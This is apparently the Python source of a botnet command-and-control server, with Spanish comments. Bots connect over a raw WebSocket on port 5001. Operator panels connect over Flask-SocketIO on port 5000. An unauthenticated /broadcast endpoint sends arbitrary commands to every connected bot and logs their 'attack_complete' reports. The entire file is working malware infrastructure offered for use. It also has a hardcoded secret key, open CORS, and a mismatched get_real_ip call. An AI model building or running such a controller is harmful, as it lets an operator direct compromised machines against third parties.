from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit, join_room, leave_room
from flask_cors import CORS
from datetime import datetime
import logging
import asyncio
import websockets
import json
import threading

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'

CORS(app)

socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Separar bots de paneles de control
connected_bots = {}      # Bots conectados (WebSocket puro)
connected_panels = {}    # Paneles de control (SocketIO)
websocket_bots = {}      # Almacenar conexiones WebSocket de bots

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============================================
# WEBSOCKET PURO PARA BOTS (Puerto 5001)
# ============================================
async def bot_handler(websocket):
    """Manejar conexiones WebSocket puras de bots"""
    bot_id = id(websocket)  # ID único basado en objeto
    
    # Obtener IP del bot
    try:
        remote_ip = get_real_ip(websocket.remote_address[0])
    except:
        remote_ip = "unknown"
    
    logger.info(f"Bot conectado (WebSocket puro): {bot_id} desde {remote_ip}")
    
    # Registrar bot
    connected_bots[bot_id] = {
        'ip': remote_ip,
        'connected_at': datetime.now().isoformat(),
        'websocket': websocket
    }
    websocket_bots[bot_id] = websocket
    
    # Notificar a paneles (SocketIO)
    notify_panels_bot_connected()
    
    try:
        # Mantener conexión y recibir respuestas
        async for message in websocket:
            data = json.loads(message)
            logger.info(f"Respuesta de bot {bot_id}: {data}")
            
            # Aquí puedes procesar respuestas del bot
            if data.get('type') == 'attack_complete':
                logger.info(f"Bot {bot_id} completó ataque")
            elif data.get('type') == 'status':
                logger.info(f"Bot {bot_id} status: {data.get('message')}")
                
    except websockets.exceptions.ConnectionClosed:
        logger.info(f"Bot desconectado: {bot_id}")
    except Exception as e:
        logger.error(f"Error en bot {bot_id}: {e}")
    finally:
        # Limpiar al desconectar
        if bot_id in connected_bots:
            del connected_bots[bot_id]
        if bot_id in websocket_bots:
            del websocket_bots[bot_id]
        
        # Notificar a paneles
        notify_panels_bot_disconnected()

def notify_panels_bot_connected():
    """Notificar a paneles SocketIO sobre nuevo bot"""
    bots_list = [
        {
            'id': str(bot_id),
            'ip': info['ip'],
            'connected_at': info['connected_at'],
        }
        for bot_id, info in connected_bots.items()
    ]
    
    socketio.emit('client_connected', {
        'total_clients': len(connected_bots)
    }, room='panels')
    
    socketio.emit('clients_update', {
        'count': len(bots_list),
        'clients': bots_list
    }, room='panels')

def notify_panels_bot_disconnected():
    """Notificar a paneles SocketIO sobre bot desconectado"""
    bots_list = [
        {
            'id': str(bot_id),
            'ip': info['ip'],
            'connected_at': info['connected_at'],
        }
        for bot_id, info in connected_bots.items()
    ]
    
    socketio.emit('client_disconnected', {
        'total_clients': len(connected_bots)
    }, room='panels')
    
    socketio.emit('clients_update', {
        'count': len(bots_list),
        'clients': bots_list
    }, room='panels')

async def start_websocket_server():
    """Iniciar servidor WebSocket puro en puerto 5001"""
    logger.info("Servidor WebSocket puro para bots iniciado en ws://0.0.0.0:5001")
    async with websockets.serve(bot_handler, "0.0.0.0", 5001):
        await asyncio.Future()  # Run forever

def run_websocket_server():
    """Ejecutar servidor WebSocket en thread separado"""
    asyncio.run(start_websocket_server())

# ============================================
# ENDPOINTS REST API
# ============================================
def get_real_ip():
    """Obtener la IP real del cliente (considerando Cloudflare)"""
    # Cloudflare envía la IP real en CF-Connecting-IP
    if request.headers.get('CF-Connecting-IP'):
        return request.headers.get('CF-Connecting-IP')
    # Fallback a X-Forwarded-For
    elif request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    # Fallback a X-Real-IP
    elif request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    # Última opción
    else:
        return request.remote_addr
    

@app.route('/')
def index():
    return jsonify({
        'status': 'ok',
        'message': 'Servidor maestro funcionando',
        'connected_bots': len(connected_bots),
        'connected_panels': len(connected_panels),
        'websocket_port': 5001,
        'socketio_port': 5000
    })


@app.route('/clients')
def get_clients():
    """Endpoint para obtener la lista de BOTS conectados"""
    bots_list = []
    for bot_id, info in connected_bots.items():
        bots_list.append({
            'id': str(bot_id),
            'ip': info['ip'],
            'connected_at': info['connected_at'],
        })
    return jsonify({
        'count': len(bots_list),
        'clients': bots_list
    })


@app.route('/broadcast', methods=['POST'])
def broadcast_message():
    """Enviar comando a TODOS los bots (WebSocket puro en puerto 5001)"""
    data = request.get_json() or {}
    message = data.get('message', 'PING')
    
    logger.info(f"Broadcasting a {len(websocket_bots)} bots: {message}")
    
    # Enviar a todos los bots WebSocket de forma asíncrona
    async def send_to_all_bots():
        disconnected = []
        tasks = []
        
        for bot_id, ws in websocket_bots.items():
            try:
                task = ws.send(json.dumps({
                    'type': 'command',
                    'message': message,
                    'timestamp': datetime.now().isoformat()
                }))
                tasks.append((bot_id, task))
            except Exception as e:
                logger.error(f"Error preparando envío a bot {bot_id}: {e}")
                disconnected.append(bot_id)
        
        # Enviar todos los mensajes en paralelo
        for bot_id, task in tasks:
            try:
                await task
            except Exception as e:
                logger.error(f"Error enviando a bot {bot_id}: {e}")
                disconnected.append(bot_id)
        
        return disconnected
    
    # Ejecutar el envío asíncrono
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    disconnected = loop.run_until_complete(send_to_all_bots())
    loop.close()
    
    # Limpiar bots desconectados
    for bot_id in disconnected:
        if bot_id in connected_bots:
            del connected_bots[bot_id]
        if bot_id in websocket_bots:
            del websocket_bots[bot_id]
    
    if disconnected:
        notify_panels_bot_disconnected()
    
    return jsonify({
        'status': 'success',
        'message': 'Broadcast enviado',
        'clients_notified': len(websocket_bots),
        'failed': len(disconnected)
    })

# ============================================
# SOCKETIO PARA PANELES DE CONTROL (Puerto 5000)
# ============================================

@socketio.on('connect')
def handle_connect():
    """Solo paneles de control usan SocketIO en puerto 5000"""
    client_id = request.sid
    client_ip = get_real_ip()
    
    logger.info(f"Cliente SocketIO conectado: {client_id} desde {client_ip}")


@socketio.on('register_as_panel')
def handle_register_as_panel():
    """Registrar como panel de control"""
    client_id = request.sid
    client_ip = get_real_ip()
    
    # Registrar como panel de control
    connected_panels[client_id] = {
        'ip': client_ip,
        'connected_at': datetime.now().isoformat(),
    }
    join_room('panels')
    logger.info(f"Panel de control registrado: {client_id} desde {client_ip}")
    
    # Enviar lista actual de bots
    bots_list = [
        {
            'id': str(bot_id),
            'ip': info['ip'],
            'connected_at': info['connected_at'],
        }
        for bot_id, info in connected_bots.items()
    ]
    
    emit('clients_update', {
        'count': len(bots_list),
        'clients': bots_list
    })


@socketio.on('disconnect')
def handle_disconnect():
    """Manejar desconexión de panel"""
    client_id = request.sid
    
    if client_id in connected_panels:
        logger.info(f"Panel desconectado: {client_id}")
        del connected_panels[client_id]
        leave_room('panels')

@socketio.on('ping')
def handle_ping(data):
    """Manejar ping de panel"""
    emit('pong', {'timestamp': datetime.now().isoformat()})


# ============================================
# INICIAR SERVIDORES
# ============================================

if __name__ == '__main__':
    # Iniciar servidor WebSocket en thread separado
    ws_thread = threading.Thread(target=run_websocket_server, daemon=True)
    ws_thread.start()
    
    logger.info("Iniciando servidor Flask-SocketIO para paneles en http://0.0.0.0:5000")
    socketio.run(app, host='0.0.0.0', port=5000, allow_unsafe_werkzeug=True)
